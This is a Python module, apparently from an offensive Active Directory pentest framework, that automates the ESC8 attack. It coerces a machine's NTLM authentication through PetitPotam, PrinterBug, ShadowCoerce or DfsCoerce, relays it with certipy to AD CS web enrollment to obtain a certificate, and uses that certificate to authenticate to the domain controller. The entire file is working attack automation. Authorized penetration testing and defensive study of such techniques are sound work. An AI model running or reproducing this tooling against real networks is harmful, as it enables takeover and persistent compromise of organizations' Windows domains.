import asyncio
import os

from tool import Tool
from module import BaseModule
from modules.coercion_petitpotam import PetitPotam
from modules.coercion_shadowcoerce import ShadowCoerce
from modules.coercion_printerbug import PrinterBug
from modules.coercion_dfscoerce import DfsCoerce

class ADCSESC8(BaseModule):
    name = "ADCS - ESC8"
    path = "adcs/esc8_ntlm"
    description = "ESC8: NTLM Relay to AD CS Web Enrollment"
    info = """The AD CS web enrollment interface (CES) does not require SSL and is vulnerable to NTLM relay attacks. An attacker can relay a computer account's NTLM authentication to this endpoint to obtain a certificate for that computer, facilitating domain persistence.

Prerequisites:
  - The AD CS HTTP Endpoint is enabled.
  - The endpoint is not configured to require SSL (though relaying to SSL endpoints is now also possible with certain techniques).
  - The attacker can coerce authentication from a target (e.g., via PetitPotam) and relay it to the web enrollment URL."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address.", "required": True},
        "template": {"default": "DomainController", "description": "ESC8 vulnerable template", "required": True},
        "coercer": {"default": "petitpotam", "description": "Coercion technique (petitpotam, printerbug, shadowcoerce, dfscoerce)", "required": True},
    }

    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)
        self.coercers = {"petitpotam": PetitPotam, "printerbug": PrinterBug, "shadowcoerce": ShadowCoerce, 'dfscoerce': DfsCoerce}
        coercer, _ = self.get_option_value("coercer")
        self.set_option("coercer", coercer)

    def set_option(self, option_name: str, value: str, is_bool: bool=False) -> bool:
        if option_name == "coercer":
            if value.lower() not in self.coercers:
                value = "petitpotam" # default
            self.paired_module = self.coercers[value.lower()](self.registry, self.job_manager)

        if option_name in self.paired_module.options:
            self.paired_module.set_option(option_name, value, is_bool)

        return super().set_option(option_name, value, is_bool)

    def unset_option(self, option_name: str) -> bool:
        if option_name in self.paired_module.options:
            self.paired_module.unset_option(option_name)
        return super().unset_option(option_name)

    async def _run(self):
        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename("esc8")

        tool.title("Run NTLM relay to AD CS")
        if not await tool.certipy_relay(['-target', self.opts.ca_host, '-template', self.opts.template, '-out', pfx]):
            return

        tool.title("Authenticate to the DC with the obtained certificate")
        if not await tool.certipy_auth(str(pfx), ['-no-save']):
            return
 
        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")

    async def run(self):
        self.paired_module.pane_a = self.pane_a
        self.paired_module.pane_b = self.pane_b
        self.paired_module.pane_c = self.pane_c
        
        if self.validate_options() and self.paired_module.validate_options():

            if hasattr(self.paired_module.opts, 'domain'):
                self.opts.domain = self.paired_module.opts.domain

            await asyncio.gather(
                self._run(),
                self.paired_module._run(self.paired_module.opts.listen_ip, self.paired_module.opts.target, sleep=3, pane=self.pane_c)
            )
